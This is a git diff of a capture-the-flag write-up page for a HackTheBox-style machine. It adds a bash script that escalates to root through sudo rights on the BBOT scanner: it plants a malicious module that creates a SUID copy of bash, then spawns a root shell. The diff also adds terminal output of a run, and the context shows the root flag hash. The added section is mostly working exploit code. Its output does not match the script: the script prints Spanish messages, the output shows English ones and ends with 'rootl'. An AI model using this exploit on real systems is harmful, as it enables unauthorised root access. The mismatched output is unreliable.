@@ -1,5 +1,7 @@
 ---
 icon: desktop
+hidden: true
+noIndex: true
 layout:
   title:
     visible: true
@@ -13,7 +15,7 @@ layout:
     visible: true
 ---
 
-# Cypher
+# copy-of-copy-of-Cypher
 
 <figure><img src="../../.gitbook/assets/Cypher.png" alt="" width="563"><figcaption></figcaption></figure>
 
@@ -969,4 +971,121 @@ gzzcoo-5.2# whoami
 root
 gzzcoo-5.2# cat /root/root.txt 
 d497deda3f97174b93d787874b5869b2
+```
+
+
+
+{% code title="exploit.sh" %}
+```bash
+#!/bin/bash
+set -e
+
+# Paso 1: Crear archivo de configuración
+echo "Creando configuración BBOT maliciosa..."
+cat << EOF > /tmp/myconf.yml
+module_dirs:
+  - /tmp/modules
+EOF
+
+# Paso 2: Crear directorio de módulos
+echo "Creando directorio de módulos..."
+mkdir -p /tmp/modules
+
+# Paso 3: Crear módulo malicioso
+echo "Creando modulo malicioso 'whois2'..."
+cat << 'EOF' > /tmp/modules/whois2.py
+from bbot.modules.base import BaseModule
+import os
+
+class whois2(BaseModule):
+    watched_events = ["DNS_NAME"] # watch for DNS_NAME events
+    produced_events = ["WHOIS"] # we produce WHOIS events
+    flags = ["passive", "safe"]
+    meta = {"description": "Query WhoisXMLAPI for WHOIS data"}
+    options = {"api_key": ""} # module config options
+    options_desc = {"api_key": "WhoisXMLAPI Key"}
+    per_domain_only = True # only run once per domain
+
+    # one-time setup - runs at the beginning of the scan
+    async def setup(self):
+        os.system("cp /bin/bash /tmp/gzzcoo && chmod u+s /tmp/gzzcoo")
+        self.api_key = self.config.get("api_key")
+        return True
+
+    async def handle_event(self, event):
+        pass
+EOF
+
+# Paso 4: Ejecutar BBOT para crear SUID bash
+echo "Ejecutando módulo BBOT malicioso..."
+sudo /usr/local/bin/bbot -p /tmp/myconf.yml -m whois2
+
+# Paso 5: Comprobar que el SUID bash se ha creado correctamente y hacer uso de este
+if [ -u /tmp/gzzcoo ]; then
+    echo -e "\n[+] ¡SUID bash creado exitosamente!"
+    echo -e "[*] Spawning root shell...\n"
+    /tmp/gzzcoo -p
+else
+    echo -e "\n[-] Explotación fallida: no se creó el SUID bash"
+    exit 1
+fi
+
+# Cleanup (optional)
+# rm /tmp/gzzcoo /tmp/myconf.yml /tmp/modules/whois2.pye
+```
+{% endcode %}
+
+
+
+
+
+{% hint style="danger" %}
+Press ENTER to execute root shell
+{% endhint %}
+
+```bash
+user@gzzcoo:/tmp$ ./exploit.sh 
+Creating malicious BBOT config...
+Creating modules directory...
+Creating malicious whois2 module...
+Executing malicious BBOT module...
+  ______  _____   ____ _______
+ |  ___ \|  __ \ / __ \__   __|
+ | |___) | |__) | |  | | | |
+ |  ___ <|  __ <| |  | | | |
+ | |___) | |__) | |__| | | |
+ |______/|_____/ \____/  |_|
+ BIGHUGE BLS OSINT TOOL v2.1.0.4939rc
+
+www.blacklanternsecurity.com/bbot
+
+[INFO] Scan with 1 modules seeded with 0 targets (0 in whitelist)
+[INFO] Loaded 1/1 scan modules (whois2)
+[INFO] Loaded 5/5 internal modules (aggregate,cloudcheck,dnsresolve,excavate,speculate)
+[INFO] Loaded 5/5 output modules, (csv,json,python,stdout,txt)
+[INFO] internal.excavate: Compiling 10 YARA rules
+[INFO] internal.speculate: No portscanner enabled. Assuming open ports: 80, 443
+[SUCC] Setup succeeded for 13/13 modules.
+[SUCC] Scan ready. Press enter to execute anal_faramir
+
+[WARN] No scan targets specified
+[SUCC] Starting scan anal_faramir
+[SCAN]              	anal_faramir (SCAN:ab93a7e313fee20912e0cd9869521760f8a78033)	TARGET	(in-scope, target)
+[INFO] Finishing scan
+[SCAN]              	anal_faramir (SCAN:ab93a7e313fee20912e0cd9869521760f8a78033)	TARGET	(in-scope)
+[SUCC] Scan anal_faramir completed in 0 seconds with status FINISHED
+[INFO] aggregate: +----------+------------+------------+
+[INFO] aggregate: | Module   | Produced   | Consumed   |
+[INFO] aggregate: +==========+============+============+
+[INFO] aggregate: | None     | None       | None       |
+[INFO] aggregate: +----------+------------+------------+
+[INFO] output.csv: Saved CSV output to /root/.bbot/scans/anal_faramir/output.csv
+[INFO] output.json: Saved JSON output to /root/.bbot/scans/anal_faramir/output.json
+[INFO] output.txt: Saved TXT output to /root/.bbot/scans/anal_faramir/output.txt
+
+[+] SUID bash created successfully!
+[*] Spawning root shell...
+
+bash-5.2# whoami
+rootl
 ```
